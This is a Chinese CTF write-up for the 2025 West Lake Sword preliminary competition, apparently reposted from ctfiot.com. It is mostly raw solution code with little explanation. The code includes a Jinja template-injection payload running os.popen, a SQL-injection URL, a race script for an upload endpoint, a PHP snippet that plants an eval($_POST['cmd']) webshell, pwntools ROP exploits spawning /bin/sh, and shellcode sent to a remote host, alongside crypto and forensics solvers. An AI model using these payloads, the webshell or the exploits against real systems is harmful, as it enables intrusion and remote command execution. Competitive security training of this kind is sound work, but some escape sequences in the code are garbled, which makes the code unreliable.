# 第八届西湖论剑·中国杭州网络安全技能大赛网络攻防实战赛-初赛 WriteUp by 金石滩小鲨鱼

> 原文: https://www.ctfiot.com/225187.html
> ID: 225187

在2025第八届西湖论剑·中国杭州网络安全技能大赛网络攻防实战赛中，金石滩小鲨鱼战队取得本次比赛第10名，现将团队的WriteUp整理如下，与师傅们共同交流学习。

签到

欢迎来到第八届西湖论剑大赛

Rank-l

sqli or not

Rank-U

Vpwn

Heaven’s door

matrixRSA

糟糕的磁盘

blink

sharkp

easydatalog

DSASignatureData

easyrawencode

END


```
{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('head+u002fu0066u006cu0061u0067u0066u0031u0034u0039').read()")}}
var express =require('express');var app =express();// 需要创建 express 实例var router = express.Router();// 创建路由实例router.get('/',(req, res, next)=>{  if(req.query.info){    if(req.url.match(/,/ig)){      res.end('hacker1!');    }    var info =JSON.parse(req.query.info);    console.log('Received info:', info);    if(info.username&& info.password){      var username = info.username;      var password = info.password;      if(info.username.match(/'|"|\/)|| info.password.match(/'|"|\/)){        res.end('hacker2!');      }      var sql ="select * from userinfo where username = '{username}' and password = '{password}'";      sql = sql.replace("{username}", username);      sql = sql.replace("{password}", password);      console.log('Received sql:', sql);      connection.query(sql,function(err, rs){        if(err){          res.end('error1');        }else{          if(rs.length>0){            res.sendFile('/flag');          }else{            res.end('username or password error');          }        }      });    }else{      res.end("please input the data");    }  }else{    res.end("please input the data");  }});// 绑定路由app.use('/', router);const port =3000;// 启动服务器app.listen(port,()=>{  console.log(`Server is running at http://localhost:${port}`);});
http://139.155.126.78:
18056/?info={"username":"$` or 1=1%23"&info="password":"123"}
import aiohttp
import asyncio
import re

BASE_URL = "http://139.155.126.78:
22542/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
}
MAX_CONCURRENT_REQUESTS = 600  # 最大并发请求数

async def find_php_route(session, base_url):
    """异步获取 PHP 文件列表"""
    try:
        async with session.get(base_url, headers=HEADERS, timeout=10) as response:
            if response.status == 200:
                html = await response.text()
                matches = re.findall(r'href="([^"]+.php)"', html)
                return matches if matches else []
            return []
    
except Exception as e:
        print(f"Error finding PHP routes: {e}")
        return []

async def check_php_file(session, file_url):
    """异步检查 PHP 文件是否可访问"""
    try:
        # 确保 URL 是完整的
        if not file_url.startswith('http'):
            file_url = f"{BASE_URL}/{file_url}"

        async with session.get(file_url, headers=HEADERS, timeout=10) as response:
            if response.status == 200:
                print(f"Success! {file_url}")
                return True
            else:
                print(f"Failed to access: {file_url} (status code: {response.status})")
                return False
    
except Exception as e:
        print(f"Error accessing {file_url}: {e}")
        return False

async def main():
    """主任务：发现并访问 PHP 文件"""
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_REQUESTS)  # 设置并发限制
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            # 异步发现 PHP 文件
            php_files = await find_php_route(session, BASE_URL)
            if php_files:
                print("Found PHP routes:")
                for php_file in php_files:
                    php_url = f"{BASE_URL}/{php_file}" if not php_file.startswith("http") else php_file
                    print(f" - {php_url}")

                # 异步并发检查所有发现的 PHP 文件
                tasks = [check_php_file(session, php_file) for php_file in php_files]
                results = await asyncio.gather(*tasks)

                # 如果任何一个文件可访问，则停止
                if any(results):
                    print("Successfully accessed a PHP file. Exiting.")
                    break

if __name__ == "__main__":
    asyncio.run(main())
<?php
    $folder = "Uploads/127.0.0.1/";
    if (!is_dir($folder)) {
        mkdir($folder, 0755, true);
    }
    $filename = $folder . "111.php";
    $content = "<?php phpinfo();@eval($_POST['cmd']); ?>";
    file_put_contents($filename, $content);
    echo "File $filename has been created with webshell content in folder $folder.";
?>
from pwn import*

def bug():
    gdb.attach(p)
    pause()
def s(a):
    p.send(a)
def sa(a,b):
    p.sendafter(a,b)
def sl(a):
    p.sendline(a)
def sla(a,b):
    p.sendlineafter(a,b)
def r(a):
    p.recv(a)
def rl(a):
    return p.recvuntil(a)
def inter():
    p.interactive()
def get_addr64():
    return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
    return u32(p.recvuntil("xf7")[-4:])
def get_sys():
    return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
    return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']

context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
    #libc = ELF('./libc.so.6')
elf=ELF('./pwn1')
    #p=remote('139.155.126.78',25416)
p = process('./pwn1')
def cmd(i):
    rl("Enter your choice: ")
    sl(str(i))

for i in range(8):
    cmd(2)
    rl("Enter the value to push: ")
    sl(b'666')

cmd(4)
rl("StackVector contents: ")
data = rl(b'n').split(b' ')
libc_addr = int(data[19]) * (1 << 32) + (int(data[18]) & 0xffffffff)
libc_base=libc_addr-0x29d90
print(hex(libc_base))
system,bin_sh=get_sys()
rdi = libc_base+libc.search(asm("pop rdinret")).__next__()

def update_entry(index, value=b'1'):
    cmd(1)
    p.recvuntil(b'edit')
    p.sendline(bytes(str(index), 'utf-8'))
    p.recvuntil(b'value')
    p.sendline(bytes(str(value), 'utf-8'))

def split_data(data, part):
    if part == 0:
        result = data & 0xffffffff
    else:
        result = (data >> 32) & 0xffffffff
    
    if result > 0x7FFFFFFF:
        result -= 2**32
    return result

update_entry(18,split_data(rdi+1,0))
update_entry(19,split_data(rdi+1,1))
update_entry(20,split_data(rdi,0))
update_entry(21,split_data(rdi,1))
update_entry(22,split_data(bin_sh,0))
update_entry(23,split_data(bin_sh,1))
update_entry(24,split_data(system,0))
update_entry(25,split_data(system,1))
    #bug()
cmd(5)

inter()
from pwn import*
from ae64 import AE64

def bug():
    gdb.attach(io)
    pause()

context(os='linux',arch='amd64',log_level='debug')
io=remote('139.155.126.78',30794)
    #io = process('./pwn')

payload=asm('''    
    mov rax, 0x67616c662f2e
    push rax
    xor rdi, rdi
    sub rdi, 100
    mov rsi, rsp
    xor edx, edx
    xor r10, r10
    push SYS_openat
    pop rax
    syscall
    mov rdi, 1
    mov rsi, 3
    push 0
    mov rdx, rsp
    mov r10, 0x100
    push SYS_sendfile
    pop rax
    syscall
    ''')
    #bug()
io.sendlineafter("MADE IN HEAVEN !!!!!!!!!!!!!!!!",payload)
io.interactive()
from gmpy2 import *
from Crypto.Util.number import *

n = 132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009
p = 9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275

p = p<<100
PR.<x> = PolynomialRing(Zmod(n))
f = p+x
res = f.small_roots(X=2^100, beta=0.4)
p = int(res[0]) + p
print(p)

"""
12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063
"""
from Crypto.Util.number import *
from sympy import *
from sage.all import *

p = 12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063
n = 132298777672085547096511087266255066285502135020124093900452138262993155381766816424955849796168059204379325075568094431259877923353664926875986223020472585645919414821322880213299188157427622804140996898685564075484754918339670099806186873974594139182324884620018780943630196754736972805036038798946726414009
C = Matrix(Zmod(n), [
    [130700952989014311434434028098810412089294728270156705618326733322297465714495704072159530618655340096705383710304658044991149662060657745933090473082775425812641300964472543605460360640675949447837208449794830578184968528547366608180085787382376536622136035364815331037493098283462540849880674541138443271941,
     71108771421281691064141020659106224750236412635914570166893031318860027728093402453305986361330527563506168063047627979831630830003190075818824767924892107148560048725155587353683119195901991465464478196049173060097561821877061015587704803006499153902855903286456023726638247758665778434728734461065079337757,
     67999998657112350704927993584783146575182096185020115836188544590466205688442741039622382576899587857972463337900200038021257164640987281308471100297698062626107380871262596623736773815445544153508352926374272336154553916204320257697068627063236060520725376727528604938949588845448940836430120015498687885615],
    [23893343854815011808020457237095285782125931083991537368666368653089096539223297567339111502968295914745423286070638369517207554770793304994639155083818859208362057394004419565231389473766857235749279110546079776040193183912062870294579472815588333047561915280189529367474392709554971446978468118280633281993,
     9711323829269829751519177755915164402658693668631868499383945203627197171508441332211907278473276713066275283973856513580205808517918096017699122954464305556795300874005627001464297760413897074044080665941802588680926430030715299713241442313300920463145903399054123967914968894345491958980945927764454159601,
     44904507975955275578858125671789564568591470104141872573541481508697254621798834910263012676346204850278744732796211742615531019931085695420000582627144871996018850098958417750918177991375489106531511894991744745328626887250694950153424439172667977623425955725695498585224383607063387876414273539268016177401],
    [67805732998935098446255672500407441801838056284635701147853683333480924477835278030145327818330916280792499177503535618310624546400536573924729837478349680007368781306805363621196573313903080315513952415535369016620873765493531188596985587834408434835281527678166509365418905214174034794683785063802543354572,
     13486048723056269216825615499052563411132892702727634833280269923882908676944418624902325737619945647093190397919828623788245644333036340084254490542292357044974139884304715033710988658109160936809398722070125690919829906642273377982021120160702344103998315875166038849942426382506293976662337161520494820727,
     95932690738697024519546289135992512776877884741458439242887603021792409575448192508456813215486904392440772808083658410285088451086298418303987628634150431725794904656250453314950126433260613949819432633322599879072805834951478466009343397728711205498602927752917834774516505262381463414617797291857077444676]
])

q = n // p
phi = (p2 -1 )*(p2-p)*(q2-1)*(q2 - q)
e = 65537

flag = ''
d = inverse(e, phi)
M = C ** d
for row in M:
    for value in row:
        flag += str(long_to_bytes(int(value)))
print(flag)
tshark -r filter1.pcapng -T fields -e http.request.uri.query.parameter -e json.object -E separator=, > extracted_data.txt
import json
import csv
import os
from Crypto.PublicKey import DSA
from Crypto.Signature import DSS
from Crypto.Hash import SHA256
import base64

public_keys = {}
public_folder = 'public'
for filename in os.listdir(public_folder):
    if filename.endswith('.pem'):
        userid = filename[7:11]
        with open(os.path.join(public_folder, filename), 'rb') as key_file:
            public_key = DSA.import_key(key_file.read())
            public_keys[userid] = public_key

sign_data_file = 'data-sign.csv'
with open(sign_data_file, newline='', encoding='utf-8') as csvfile:
    reader = csv.DictReader(csvfile)
    altered_data = []
    for row in reader:
        userid = row['username']
        name_signature = base64.b64decode(row['name_signature'])
        idcard_signature = base64.b64decode(row['idcard_signature'])
        phone_signature = base64.b64decode(row['phone_signature'])

        original_data_file = 'extracted_data.csv'
        with open(original_data_file, newline='', encoding='utf-8-sig') as original_csvfile:
            original_reader = csv.DictReader(original_csvfile)
            for original_row in original_reader:
                if original_row['user'] == userid:
                    data_str = original_row['data']
                    data_dict = json.loads(data_str.replace('""', '"').replace('\"', '"'))
                    break

        name = data_dict['name'].encode('utf-8').decode('unicode_escape')
        public_key = public_keys.get(userid.zfill(4))

        if public_key is not None:
            signer = DSS.new(public_key, 'fips-186-3')
            name_hash = SHA256.new(name.encode())
            try:
                signer.verify(name_hash, name_signature)
                print(f"用户 {userid} 的 name 验证通过")
            
except ValueError:
                print(f"用户 {userid} 的 name 验证失败")
                altered_data.append({
                    'userid': userid,
                    'name': name,
                    'idcard': data_dict['idcard'],
                    'phone': data_dict['phone'],
                    'error_field': 'name'
                })

            idcard_hash = SHA256.new(data_dict['idcard'].encode())
            try:
                signer.verify(idcard_hash, idcard_signature)
                print(f"用户 {userid} 的 idcard 验证通过")
            
except ValueError:
                print(f"用户 {userid} 的 idcard 验证失败")
                altered_data.append({
                    'userid': userid,
                    'name': name,
                    'idcard': data_dict['idcard'],
                    'phone': data_dict['phone'],
                    'error_field': 'idcard'
                })

            phone_hash = SHA256.new(data_dict['phone'].encode())
            try:
                signer.verify(phone_hash, phone_signature)
                print(f"用户 {userid} 的 phone 验证通过")
            
except ValueError:
                print(f"用户 {userid} 的 phone 验证失败")
                altered_data.append({
                    'userid': userid,
                    'name': name,
                    'idcard': data_dict['idcard'],
                    'phone': data_dict['phone'],
                    'error_field': 'phone'
                })
        else:
            print(f"未找到 {userid} 对应的公钥")

altered_file = 'altered_data.csv'
with open(altered_file, 'w', newline='', encoding='utf-8') as csvfile:
    fieldnames = ['userid', 'name', 'idcard', 'phone']
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    writer.writeheader()
    for row in altered_data:
        writer.writerow({
            'userid': row['userid'],
            'name': row['name'],
            'idcard': row['idcard'],
            'phone': row['phone']
        })
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

enckey = bytes.fromhex("20d96098010eb9b326be6c46e1ce1ca679e29f1d65dec055cf8c46c6436c3356af2dc312b2d35466308b9fff0dd427b44a37e34fca12992e45db2ddd81884bd8eb5bccd3c595e8a9a352bd61322e1d52329d6c8638bbfce65edffbc4d3a5759e88c0f90e31ce518837552a3a09d8e7e3c374f3857bfe501cce2066fb233ff1f5faac18d73c3b665a54e8c55574f16bf4678c5ce835d2a14a65f8c1cec012435a8c06314cbe727a3a9b6060dfd6cdb850073423841178f6f409bb7ce8d4863c6f58855954d34af3d2964c488c9057c8c5072a54e43f1f8039d32409eb1ff3abca41c0b302788c4c56c1a4be4506ff5b8aff0242e21c0ee7ffee2da20ed9434334")
nonce = bytes.fromhex("d919c229aab6535efa09a52c589c8f47")
tag = bytes.fromhex("5b204675b1b173c32c04b0b8a100ee29")

# 读取私钥
with open('pri.pem', 'r') as f:
    pri_key = RSA.import_key(f.read())

# 读取加密数据
with open('encrypted_data.bin', 'rb') as f:
    enc_data = f.read()

# 使用RSA私钥解密AES密钥
de_rsa = PKCS1_OAEP.new(pri_key)
try:
    aes_key_decrypted = de_rsa.decrypt(enckey)
except ValueError as e:
    print("RSA解密AES密钥失败：", e)
    raise

# 使用解密后的AES密钥解密文件数据
try:
    de_aes = AES.new(aes_key_decrypted, AES.MODE_EAX, nonce=nonce)
    decrypted_data = de_aes.decrypt_and_verify(enc_data, tag)
except ValueError as e:
    print("AES解密失败或验证失败：", e)
    raise

# 将解密后的数据写入文件
with open('decrypted_data.csv', 'wb') as f:
    f.write(decrypted_data)

print("Successfully decrypted data")
import base64
import pandas as pd
from Crypto.Cipher import ARC4

data = pd.read_csv('decrypted_data.csv')
for index, row in data.iterrows():
    encrypted = row['个性签名(加密版)']
    password = row['密码']

    enc_de_base64 = base64.b64decode(encrypted)
    rc4 = ARC4.new(password.encode())
    de_rc4 = rc4.decrypt(enc_de_base64).decode('utf-8')
    if "DASCTF{" in de_rc4:
        print(f"得到结果:{de_rc4}")
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/4-1737420644.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/10-1737420645.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/5-1737420645.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/8-1737420646.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/2-1737420647.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/8-1737420647.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/5-1737420648.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/8-1737420649.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/2-1737420649.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/01/8-1737420650.png)